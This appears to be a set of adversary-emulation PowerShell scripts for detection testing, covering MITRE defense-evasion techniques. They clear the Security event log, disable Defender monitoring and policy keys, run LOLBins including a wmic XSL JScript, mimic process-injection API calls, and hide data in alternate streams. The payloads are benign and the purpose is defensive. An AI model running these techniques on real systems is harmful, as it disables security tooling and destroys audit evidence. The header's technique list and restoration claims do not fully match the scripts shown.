description: Adversary emulation scripts for the MITRE ATT&CK Defense Evasion tactic (TA0005). Covers 10 scriptable parent techniques: indicator removal via event log clearing (wevtutil), impair defenses via Defender exclusion path (Set-MpPreference), LOLBin proxy execution via mshta/rundll32/regsvr32, timestomping (NTFS $STANDARD_INFORMATION manipulation), NTFS Alternate Data Stream file hiding, masquerading via renamed system binary, process injection simulation via VirtualAllocEx API polling pattern, deobfuscation via base64 string roundtrip, indirect command execution via forfiles.exe LOLBin, and modify registry to disable security tooling (Defender periodic scan). All scripts include automatic cleanup and restoration of any modified state.
author: X3M.AI
prerequisites: Windows 10/11 or Windows Server 2019/2022 test machine with Morgana agent installed
Microsoft Defender for Endpoint (MDE) onboarded and data connector active in Microsoft Sentinel
Windows Security Events via AMA connector active in Microsoft Sentinel (Event IDs: 4688, 1102, 4719)
For T1070 (event log clearing): local Administrator or SYSTEM required (wevtutil cl Security generates Event ID 1102)
For T1562 (impair defenses - Defender exclusion): local Administrator or SYSTEM required (Set-MpPreference requires elevation)
For T1055 (process injection simulation): no elevation required - API call pattern only, no actual injection performed
All other scripts run as standard user
Test environment only - never run against production systems or monitored production environments

Adding and removing Defender exclusions generates telemetry in MDE and is covered by the Sentinel rule 'Attempt to disable security monitoring'.

Three LOLBins are used in sequence: mshta.exe (HTML Application execution), rundll32.exe (DLL function invocation pattern), and regsvr32.exe /s /n (silent registration pattern). All commands execute benign system code. The process creation events for these three LOLBins are among the most monitored in MDE.

Copies a legitimate system binary (default: calc.exe) to the Defender-excluded temp directory with a disguised name, then executes and removes it. Adversaries rename system executables to blend in with normal processes. MDE detects execution of system binaries from non-standard paths.

scripts.name: Excalibur - DefenseEvasion-T1027-Obfuscated Files
scripts.description: Demonstrates obfuscation via base64 encoding and decoding of a PowerShell payload: encodes a benign command to base64, writes the encoded string to a file in the Defender-excluded temp directory, then decodes and executes it from the file. This encode-to-file + decode-and-execute pattern is a standard adversary technique for bypassing signature-based detection and is monitored by MDE AMSI behavioral rules. The encoded file and intermediate artefacts are removed after execution.
scripts.command: Write-Host '[START] T1027 - Obfuscated Files or Information (base64 encode/decode/execute pattern)'; $tmpDir = '#{excalibur_de_temp_dir}'; if (-not (Test-Path $tmpDir)) { New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null }; $encodedFile = Join-Path $tmpDir 'MorganaTest-T1027-payload.b64'; $clearPayload = 'Write-Host MorganaTest-T1027-DeobfuscatedPayload'; try { $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($clearPayload)); Set-Content -Path $encodedFile -Value $encoded -Encoding ASCII -ErrorAction Stop; Write-Host ('[INFO] Encoded payload written to: ' + $encodedFile + ' (' + $encoded.Length + ' chars)'); $readBack = Get-Content -Path $encodedFile -Raw -ErrorAction Stop; $decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($readBack.Trim())); Write-Host ('[INFO] Decoded payload: ' + $decoded + ' (matches original: ' + ($decoded -eq $clearPayload) + ')'); $encodedArg = '-NoProfile -NonInteractive -WindowStyle Hidden -EncodedCommand ' + $encoded; $proc = Start-Process -FilePath 'powershell.exe' -ArgumentList $encodedArg -PassThru -Wait -ErrorAction Stop; Write-Host ('[INFO] Decoded payload executed - exit code: ' + $proc.ExitCode); Remove-Item $encodedFile -ErrorAction SilentlyContinue; Write-Host '[SUCCESS] T1027 - Obfuscated payload encode/write/decode/execute completed. Sentinel target: Obfuscated command execution via base64 decode pattern (MDE AMSI + PowerShell script block logging)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); Remove-Item $encodedFile -ErrorAction SilentlyContinue }
scripts.cleanup_command: Remove-Item (Join-Path '#{excalibur_de_temp_dir}' 'MorganaTest-T1027-payload.b64') -ErrorAction SilentlyContinue; Write-Host '[INFO] T1027 cleanup: encoded payload file removed if still present'
scripts.detection_rule: Obfuscated command execution via base64 decode pattern (MDE AMSI + PowerShell script block logging)

scripts.name: Excalibur - DefenseEvasion-T1036-Masquerading
scripts.description: Copies a legitimate system binary (calc.exe by default) to the Defender-excluded temp directory under a disguised name (svchost32.exe by default), then executes it and removes it. Simulates adversary masquerading of malicious binaries as legitimate system processes. MDE detects the execution of a system binary from a non-standard path, which is a high-fidelity masquerading signal regardless of the binary content.
scripts.command: Write-Host '[START] T1036 - Masquerading (renamed system binary execution from non-standard path)'; $tmpDir = '#{excalibur_de_temp_dir}'; if (-not (Test-Path $tmpDir)) { New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null }; $sourceBinary = '#{excalibur_de_t1036_source_binary}'; $disguisedName = '#{excalibur_de_t1036_disguised_name}'; $masqPath = Join-Path $tmpDir $disguisedName; try { if (-not (Test-Path $sourceBinary)) { Write-Host ('[ERROR] Source binary not found: ' + $sourceBinary); exit 1 }; Copy-Item -Path $sourceBinary -Destination $masqPath -Force -ErrorAction Stop; Write-Host ('[INFO] Binary copied: ' + $sourceBinary + ' -> ' + $masqPath); Write-Host ('[INFO] Executing masqueraded binary from non-standard path: ' + $masqPath); $proc = Start-Process -FilePath $masqPath -PassThru -ErrorAction Stop; Start-Sleep 2; if (-not $proc.HasExited) { $proc.Kill() }; Write-Host ('[INFO] Process PID ' + $proc.Id + ' exit code: ' + $proc.ExitCode); Remove-Item $masqPath -ErrorAction SilentlyContinue; Write-Host '[SUCCESS] T1036 - Masqueraded binary executed from non-standard path. Sentinel target: Execution of renamed system binary from non-standard path (MDE behavioral - process running from temp/ProgramData masquerade detection)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); Remove-Item $masqPath -ErrorAction SilentlyContinue }
scripts.cleanup_command: Remove-Item (Join-Path '#{excalibur_de_temp_dir}' '#{excalibur_de_t1036_disguised_name}') -ErrorAction SilentlyContinue; Write-Host '[INFO] T1036 cleanup: masqueraded binary removed if still present'
scripts.detection_rule: Execution of renamed system binary from non-standard path

scripts.name: Excalibur - DefenseEvasion-T1055-Process Injection Simulation
scripts.description: Simulates the API call pattern used by process injection techniques via P/Invoke: calls OpenProcess (PROCESS_ALL_ACCESS) on calc.exe or notepad.exe (launched as a sacrificial target), followed by VirtualAllocEx (MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE), then immediately frees the allocation and closes the handle. No shellcode is written. No actual injection is performed. The OpenProcess + VirtualAllocEx sequence with PAGE_EXECUTE_READWRITE is the primary MDE behavioral indicator for process injection techniques (used by Cobalt Strike, Metasploit).
scripts.command: Write-Host '[START] T1055 - Process Injection simulation (OpenProcess + VirtualAllocEx API pattern)'; try { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class MorganaT1055 { [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId); [DllImport("kernel32.dll", SetLastError=true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport("kernel32.dll", SetLastError=true)] public static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType); [DllImport("kernel32.dll", SetLastError=true)] public static extern bool CloseHandle(IntPtr hObject); }' -ErrorAction Stop; Write-Host '[INFO] Launching sacrificial target process (notepad.exe)'; $targetProc = Start-Process -FilePath 'notepad.exe' -PassThru -ErrorAction Stop; Start-Sleep 1; Write-Host ('[INFO] Target PID: ' + $targetProc.Id); $PROCESS_ALL_ACCESS = 0x1F0FFF; $MEM_COMMIT = 0x1000; $MEM_RESERVE = 0x2000; $PAGE_EXECUTE_READWRITE = 0x40; $MEM_RELEASE = 0x8000; $hProcess = [MorganaT1055]::OpenProcess($PROCESS_ALL_ACCESS, $false, [uint32]$targetProc.Id); if ($hProcess -eq [IntPtr]::Zero) { Write-Host ('[ERROR] OpenProcess failed - Win32Error: ' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()); $targetProc.Kill(); exit 1 }; Write-Host ('[INFO] OpenProcess(PROCESS_ALL_ACCESS) succeeded - handle: ' + $hProcess + ' (OpenProcess is the primary injection indicator in MDE)'); $allocAddr = [MorganaT1055]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 4096, ($MEM_COMMIT -bor $MEM_RESERVE), $PAGE_EXECUTE_READWRITE); if ($allocAddr -eq [IntPtr]::Zero) { Write-Host ('[WARN] VirtualAllocEx failed - Win32Error: ' + [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() + ' (Credential Guard or security policy may block cross-process RWX allocation - expected)') } else { Write-Host ('[INFO] VirtualAllocEx(MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE) allocated at: ' + $allocAddr + ' (RWX allocation in remote process - primary injection pattern)'); [MorganaT1055]::VirtualFreeEx($hProcess, $allocAddr, 0, $MEM_RELEASE) | Out-Null; Write-Host '[INFO] VirtualFreeEx: allocation freed - no shellcode written, no injection performed' }; [MorganaT1055]::CloseHandle($hProcess) | Out-Null; $targetProc.Kill(); Write-Host '[SUCCESS] T1055 - Process injection API pattern completed. Sentinel target: OpenProcess + VirtualAllocEx PAGE_EXECUTE_READWRITE in remote process (MDE behavioral process injection detection)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue }
scripts.cleanup_command: Get-Process -Name notepad -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue; Write-Host '[INFO] T1055 cleanup: notepad target process terminated if still running'
scripts.detection_rule: OpenProcess + VirtualAllocEx PAGE_EXECUTE_READWRITE in remote process (process injection pattern)

scripts.name: Excalibur - DefenseEvasion-T1070-Indicator Removal
scripts.description: Clears a Windows event log using wevtutil.exe cl (LOLBin), simulating adversary attempt to destroy forensic evidence. Clearing the Security log generates Event ID 1102 (The audit log was cleared), which has its own Sentinel built-in analytics rule and is one of the most high-fidelity defense evasion indicators. Clearing the Application log generates MDE process creation telemetry. Requires local Administrator or SYSTEM.
scripts.command: Write-Host '[START] T1070 - Indicator Removal (event log clearing via wevtutil)'; $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if (-not $isAdmin) { Write-Host '[ERROR] T1070 requires local Administrator or SYSTEM.'; exit 1 }; $logName = '#{excalibur_de_t1070_log_name}'; try { $beforeCount = (& wevtutil.exe gli $logName 2>&1 | Select-String 'numberOfLogRecords').ToString().Split(':')[1].Trim(); Write-Host ('[INFO] Log: ' + $logName + ' | Records before clear: ' + $beforeCount); Write-Host ('[INFO] Invoking: wevtutil.exe cl ' + $logName + ' (LOLBin - generates process creation + Event ID 1102 if Security log)'); $proc = Start-Process -FilePath 'wevtutil.exe' -ArgumentList ('cl ' + $logName) -PassThru -Wait -ErrorAction Stop; Write-Host ('[INFO] wevtutil exit code: ' + $proc.ExitCode); $afterCount = (& wevtutil.exe gli $logName 2>&1 | Select-String 'numberOfLogRecords').ToString().Split(':')[1].Trim(); Write-Host ('[INFO] Records after clear: ' + $afterCount + ' | Log cleared: ' + ($afterCount -eq '0' -or $afterCount -eq ' 0')); if ($logName -eq 'Security') { Write-Host '[INFO] Security log cleared - Event ID 1102 (The audit log was cleared) was generated - this is the Sentinel detection trigger' } else { Write-Host ('[INFO] ' + $logName + ' log cleared - MDE wevtutil.exe process creation telemetry generated') }; Write-Host '[SUCCESS] T1070 - Event log cleared via wevtutil. Sentinel target: Windows Event Log Cleared (Event ID 1102 for Security / MDE wevtutil.exe process creation behavioral)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message) }
scripts.cleanup_command: Write-Host '[INFO] T1070 cleanup: event log was cleared - no further cleanup needed. Security log clearing (Event ID 1102) is self-documenting in the Windows event stream.'
scripts.detection_rule: Windows Event Log Cleared (Event ID 1102 for Security log / wevtutil.exe process creation)

scripts.name: Excalibur - DefenseEvasion-T1112-Modify Registry
scripts.description: Modifies the Windows Defender DisableAntiSpyware and DisableRealtimeMonitoring registry values under HKLM\SOFTWARE\Policies\Microsoft\Windows Defender, simulating adversary attempt to disable security tooling via Group Policy registry keys. Values are set to 1 (disable) then immediately restored to 0 (enable) or deleted if they did not exist before. The registry write to Defender policy keys generates MDE registry modification telemetry and triggers the Sentinel 'Attempt to disable security monitoring' analytics rule.
scripts.command: Write-Host '[START] T1112 - Modify Registry (Windows Defender policy keys - disable/re-enable simulation)'; $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if (-not $isAdmin) { Write-Host '[ERROR] T1112 (HKLM Defender policy) requires local Administrator or SYSTEM.'; exit 1 }; $defenderPolicyPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'; $targetValues = @('DisableAntiSpyware', 'DisableRealtimeMonitoring'); $previousValues = @{}; try { if (-not (Test-Path $defenderPolicyPath)) { New-Item -Path $defenderPolicyPath -Force -ErrorAction Stop | Out-Null; Write-Host ('[INFO] Registry key created: ' + $defenderPolicyPath) }; foreach ($valueName in $targetValues) { $existing = Get-ItemProperty -Path $defenderPolicyPath -Name $valueName -ErrorAction SilentlyContinue; $previousValues[$valueName] = if ($existing) { $existing.$valueName } else { $null }; Write-Host ('[INFO] Before: ' + $valueName + ' = ' + $(if ($null -ne $previousValues[$valueName]) { $previousValues[$valueName] } else { '(not set)' })); Set-ItemProperty -Path $defenderPolicyPath -Name $valueName -Value 1 -Type DWord -Force -ErrorAction Stop; Write-Host ('[INFO] Set: ' + $valueName + ' = 1 (disable) at ' + $defenderPolicyPath + ' - MDE registry modification event generated') }; Start-Sleep 2; foreach ($valueName in $targetValues) { if ($null -ne $previousValues[$valueName]) { Set-ItemProperty -Path $defenderPolicyPath -Name $valueName -Value $previousValues[$valueName] -Type DWord -Force -ErrorAction SilentlyContinue; Write-Host ('[INFO] Restored: ' + $valueName + ' = ' + $previousValues[$valueName]) } else { Remove-ItemProperty -Path $defenderPolicyPath -Name $valueName -ErrorAction SilentlyContinue; Write-Host ('[INFO] Removed: ' + $valueName + ' (was not set before test)') } }; Write-Host '[SUCCESS] T1112 - Defender policy registry modification completed and restored. Sentinel target: Attempt to disable security monitoring (MDE registry modification to Defender policy keys)'  } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); foreach ($valueName in $targetValues) { if ($null -ne $previousValues[$valueName]) { Set-ItemProperty -Path $defenderPolicyPath -Name $valueName -Value $previousValues[$valueName] -Type DWord -Force -ErrorAction SilentlyContinue } else { Remove-ItemProperty -Path $defenderPolicyPath -Name $valueName -ErrorAction SilentlyContinue } } }
scripts.cleanup_command: $defenderPolicyPath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'; foreach ($v in @('DisableAntiSpyware','DisableRealtimeMonitoring')) { Remove-ItemProperty -Path $defenderPolicyPath -Name $v -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1112 cleanup: Defender policy registry values removed if still present'
scripts.detection_rule: Attempt to disable security monitoring (Defender policy registry modification)

scripts.name: Excalibur - DefenseEvasion-T1218-LOLBin Proxy Execution
scripts.description: Executes three of the most commonly abused Windows system binary proxies in sequence: (1) mshta.exe with an inline JavaScript close() call (HTML Application LOLBin); (2) rundll32.exe invoking the legitimate Shell32 ShellExec_RunDLL export (DLL proxy execution pattern); (3) regsvr32.exe /s /n /u with a path that does not exist (silent no-UI COM registration pattern - also known as Squiblydoo). All three generate MDE process creation telemetry and are covered by Sentinel built-in analytics rules for LOLBin abuse.
scripts.command: Write-Host '[START] T1218 - System Binary Proxy Execution (mshta + rundll32 + regsvr32 LOLBins)'; Write-Host '[INFO] LOLBin 1/3: mshta.exe (HTML Application execution)'; try { $jsPayload = '#{excalibur_de_t1218_js_payload}'; $proc1 = Start-Process -FilePath 'mshta.exe' -ArgumentList $jsPayload -PassThru -Wait -ErrorAction Stop; Write-Host ('[INFO] mshta.exe exit code: ' + $proc1.ExitCode + ' | Payload: ' + $jsPayload) } catch { Write-Host ('[WARN] mshta.exe error: ' + $_.Exception.Message) }; Write-Host '[INFO] LOLBin 2/3: rundll32.exe (DLL function proxy execution)'; try { $proc2 = Start-Process -FilePath 'rundll32.exe' -ArgumentList 'Shell32.dll,ShellExec_RunDLL cmd.exe /c echo MorganaTest-T1218-rundll32' -PassThru -Wait -ErrorAction Stop; Write-Host ('[INFO] rundll32.exe exit code: ' + $proc2.ExitCode + ' | Export: Shell32.dll,ShellExec_RunDLL') } catch { Write-Host ('[WARN] rundll32.exe error: ' + $_.Exception.Message) }; Write-Host '[INFO] LOLBin 3/3: regsvr32.exe /s /n /u (Squiblydoo silent registration pattern)'; try { $proc3 = Start-Process -FilePath 'regsvr32.exe' -ArgumentList '/s /n /u C:\MorganaTest-Nonexistent.dll' -PassThru -Wait -ErrorAction Stop; Write-Host ('[INFO] regsvr32.exe exit code: ' + $proc3.ExitCode + ' (non-zero expected - DLL does not exist - process creation event is the detection target)') } catch { Write-Host ('[WARN] regsvr32.exe error: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1218 - LOLBin proxy execution via mshta + rundll32 + regsvr32 completed. Sentinel target: Suspicious LOLBin proxy execution (MDE - mshta.exe / rundll32.exe / regsvr32.exe behavioral detection)'
scripts.cleanup_command: Write-Host '[INFO] T1218 cleanup: no artefacts - process-only execution'
scripts.detection_rule: Suspicious LOLBin proxy execution (mshta.exe / rundll32.exe / regsvr32.exe)

scripts.name: Excalibur - DefenseEvasion-T1220-XSL Script Processing
scripts.description: Creates a minimal XSL file containing a benign JScript payload and executes it via wmic.exe /format: (the classic XSL script processing / WMIC LOLBin technique). This technique bypasses application whitelisting because wmic.exe is a trusted system binary. The XSL file is written to the Defender-excluded temp directory and removed after execution. wmic.exe with /format: pointing to an external or local XSL file is a well-known defense evasion technique (T1220) used by APT groups and covered by MDE behavioral rules.
scripts.command: Write-Host '[START] T1220 - XSL Script Processing via wmic.exe /format: (WMIC XSL LOLBin)'; $tmpDir = '#{excalibur_de_temp_dir}'; if (-not (Test-Path $tmpDir)) { New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null }; $xslPath = Join-Path $tmpDir 'MorganaTest-T1220.xsl'; try { $xslContent = '<?xml version="1.0"?><xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0"><msxsl:script language="JScript" implements-prefix="user"><![CDATA[function foo(){var r = new ActiveXObject("WScript.Shell"); r.Run("cmd.exe /c echo MorganaTest-T1220-XSLExecution",0,true); return "MorganaTest-T1220";}]]></msxsl:script><xsl:template match="/"><xsl:value-of select="user:foo()"/></xsl:template></xsl:stylesheet>'; Set-Content -Path $xslPath -Value $xslContent -Encoding UTF8 -ErrorAction Stop; Write-Host ('[INFO] XSL script written: ' + $xslPath + ' | Size: ' + (Get-Item $xslPath).Length + ' bytes'); Write-Host '[INFO] Invoking: wmic.exe os get /format:<xslpath> (classic wmic XSL script processing LOLBin pattern)'; $wmiArgs = 'os get /format:' + $xslPath; $proc = Start-Process -FilePath 'wmic.exe' -ArgumentList $wmiArgs -PassThru -Wait -ErrorAction Stop; Write-Host ('[INFO] wmic.exe /format exit code: ' + $proc.ExitCode); Remove-Item $xslPath -ErrorAction SilentlyContinue; Write-Host '[SUCCESS] T1220 - XSL script processing via wmic.exe /format completed. Sentinel target: WMIC XSL script execution (MDE behavioral - wmic.exe loading script from local/remote path)'  } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); Remove-Item $xslPath -ErrorAction SilentlyContinue }
scripts.cleanup_command: Remove-Item (Join-Path '#{excalibur_de_temp_dir}' 'MorganaTest-T1220.xsl') -ErrorAction SilentlyContinue; Write-Host '[INFO] T1220 cleanup: XSL file removed if still present'

scripts.name: Excalibur - DefenseEvasion-T1497-Virtualization Sandbox Evasion
scripts.description: Enumerates common sandbox and virtualization detection indicators used by malware to detect analysis environments: checks registry for VM vendor keys (VMware, VirtualBox, Hyper-V, QEMU), examines running processes for analysis tools (Wireshark, Procmon, Fiddler, OllyDbg, x64dbg), checks for sandbox artifacts in environment variables and filesystem (sbiedll.dll, SbieDrv, wine registry), and queries CPUID/timing. Adversaries perform these checks to evade dynamic analysis. The checks themselves are monitored by MDE as sandbox evasion behavioral indicators.
scripts.command: Write-Host '[START] T1497 - Virtualization/Sandbox Evasion (environment check simulation)'; Write-Host '[INFO] Check 1/4: VM vendor registry keys'; $vmRegKeys = @( 'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools', 'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions', 'HKLM:\SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters', 'HKLM:\HARDWARE\ACPI\DSDT\VBOX__', 'HKLM:\HARDWARE\ACPI\DSDT\BXPC___' ); foreach ($key in $vmRegKeys) { $exists = Test-Path $key; Write-Host ('    ' + $key.Split('\')[-1] + ': ' + $(if ($exists) { 'FOUND (VM indicator)' } else { 'not found' })) }; Write-Host '[INFO] Check 2/4: Analysis tool processes'; $analysisProcs = @('wireshark','procmon','procmon64','fiddler','ollydbg','x64dbg','x32dbg','windbg','processhacker','idaq','idaq64','autoruns','tcpview','regshot'); $running = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ProcessName; foreach ($tool in $analysisProcs) { $found = $running -icontains $tool; if ($found) { Write-Host ('    ' + $tool + ': RUNNING (analysis tool detected)') } }; Write-Host ('    Analysis tools running: ' + (@($running | Where-Object { $_ -in $analysisProcs }).Count) + '/' + $analysisProcs.Count); Write-Host '[INFO] Check 3/4: Sandbox filesystem artifacts'; $sbArtifacts = @( 'C:\windows\System32\sbiedll.dll', 'C:\windows\SysWOW64\sbiedll.dll' ); foreach ($a in $sbArtifacts) { Write-Host ('    ' + (Split-Path $a -Leaf) + ': ' + $(if (Test-Path $a) { 'FOUND (sandbox indicator)' } else { 'not found' })) }; Write-Host '[INFO] Check 4/4: CPUID hypervisor bit via .NET (timing + HV bit check)'; try { $start = [System.Diagnostics.Stopwatch]::GetTimestamp(); for ($i=0; $i -lt 1000; $i++) { $null = [System.Environment]::TickCount }; $elapsed = [System.Diagnostics.Stopwatch]::GetTimestamp() - $start; $freq = [System.Diagnostics.Stopwatch]::Frequency; $ms = [math]::Round(($elapsed / $freq) * 1000, 3); Write-Host ('    1000-loop timing: ' + $ms + ' ms (high-precision timing anomaly check - VMs typically slower)') } catch { Write-Host ('    Timing check error: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1497 - Sandbox/virtualization evasion checks completed. Sentinel target: Sandbox evasion behavior pattern (MDE behavioral - environment fingerprinting checks post-execution)'
scripts.cleanup_command: Write-Host '[INFO] T1497 cleanup: no artefacts - read-only environment checks only'
scripts.detection_rule: Sandbox evasion behavior pattern (VM/analysis tool environment checks)

scripts.name: Excalibur - DefenseEvasion-T1562-Impair Defenses
scripts.description: Temporarily adds a path exclusion to Microsoft Defender via Set-MpPreference -ExclusionPath, then immediately removes it via Remove-MpPreference. Also attempts Set-MpPreference -DisableRealtimeMonitoring $true (immediately reversed to $false). Both operations generate MDE telemetry and are covered by the Sentinel built-in rule 'Attempt to disable security monitoring'. Requires local Administrator or SYSTEM.
scripts.command: Write-Host '[START] T1562 - Impair Defenses (Defender exclusion add/remove + realtime monitoring toggle)'; $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if (-not $isAdmin) { Write-Host '[ERROR] T1562 requires local Administrator or SYSTEM.'; exit 1 }; $exclPath = '#{excalibur_de_t1562_exclusion_path}'; try { Write-Host '[INFO] Step 1/3: Add Defender exclusion path via Set-MpPreference -ExclusionPath'; Set-MpPreference -ExclusionPath $exclPath -ErrorAction Stop; Write-Host ('[INFO] Exclusion added: ' + $exclPath + ' - MDE Set-MpPreference telemetry generated'); Start-Sleep 1; $prefs = Get-MpPreference -ErrorAction SilentlyContinue; $excluded = @($prefs.ExclusionPath) -contains $exclPath; Write-Host ('[INFO] Exclusion verified in Get-MpPreference: ' + $excluded); Write-Host '[INFO] Step 2/3: Remove Defender exclusion via Remove-MpPreference'; Remove-MpPreference -ExclusionPath $exclPath -ErrorAction SilentlyContinue; Write-Host ('[INFO] Exclusion removed: ' + $exclPath); Write-Host '[INFO] Step 3/3: Toggle DisableRealtimeMonitoring (set true then immediately false)'; Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; Write-Host '[INFO] Set-MpPreference -DisableRealtimeMonitoring $true (detection event generated)'; Start-Sleep 1; Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue; Write-Host '[INFO] Set-MpPreference -DisableRealtimeMonitoring $false (restored)'; Write-Host '[SUCCESS] T1562 - Defender impairment actions completed and restored. Sentinel target: Attempt to disable security monitoring (MDE behavioral - Set-MpPreference abuse detection)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); Remove-MpPreference -ExclusionPath $exclPath -ErrorAction SilentlyContinue; Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue }
scripts.cleanup_command: Remove-MpPreference -ExclusionPath '#{excalibur_de_t1562_exclusion_path}' -ErrorAction SilentlyContinue; Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue; Write-Host '[INFO] T1562 cleanup: Defender exclusion removed and realtime monitoring re-enabled if necessary'
scripts.detection_rule: Attempt to disable security monitoring (Set-MpPreference abuse)

scripts.name: Excalibur - DefenseEvasion-T1564-Hide Artifacts
scripts.description: Creates an NTFS Alternate Data Stream (ADS) on a file in the Defender-excluded temp directory, simulating adversary use of ADS to hide data or payloads within legitimate files. Creates a primary file and writes a hidden payload to its :MorganaTest stream. Reads the payload back from the ADS to confirm write. Both the primary file and its ADS are removed after the test. MDE detects Alternate Data Stream creation and access, particularly on executables and script files.
scripts.command: Write-Host '[START] T1564 - Hide Artifacts (NTFS Alternate Data Stream)'; $tmpDir = '#{excalibur_de_temp_dir}'; if (-not (Test-Path $tmpDir)) { New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null }; $primaryFile = Join-Path $tmpDir 'MorganaTest-T1564-carrier.txt'; $adsPath = $primaryFile + ':MorganaHidden'; try { Set-Content -Path $primaryFile -Value 'This is a normal file.' -Encoding UTF8 -ErrorAction Stop; Write-Host ('[INFO] Primary file created: ' + $primaryFile); Set-Content -Path $adsPath -Value 'MorganaTest-T1564-HiddenPayload' -Encoding UTF8 -ErrorAction Stop; Write-Host ('[INFO] ADS written: ' + $adsPath + ' (data hidden in NTFS alternate data stream - invisible to dir listing)'); $verifyContent = Get-Content -Path $adsPath -ErrorAction Stop; Write-Host ('[INFO] ADS read-back: ' + $verifyContent); $streams = Get-Item -Path $primaryFile -Stream * -ErrorAction SilentlyContinue; Write-Host ('[INFO] Streams on file: ' + ($streams | ForEach-Object { $_.Stream + '(' + $_.Length + 'b)' } | Join-String -Separator ', ')); Start-Sleep 2; Remove-Item -Path $primaryFile -Stream MorganaHidden -ErrorAction SilentlyContinue; Remove-Item -Path $primaryFile -ErrorAction SilentlyContinue; Write-Host '[SUCCESS] T1564 - NTFS Alternate Data Stream created and removed. Sentinel target: NTFS ADS creation detected (MDE behavioral - alternate data stream write on file in non-standard path)' } catch { Write-Host ('[ERROR] ' + $_.Exception.Message); Remove-Item $primaryFile -ErrorAction SilentlyContinue }
scripts.cleanup_command: Remove-Item (Join-Path '#{excalibur_de_temp_dir}' 'MorganaTest-T1564-carrier.txt') -ErrorAction SilentlyContinue; Write-Host '[INFO] T1564 cleanup: carrier file and ADS removed if still present'
scripts.detection_rule: NTFS Alternate Data Stream creation detected
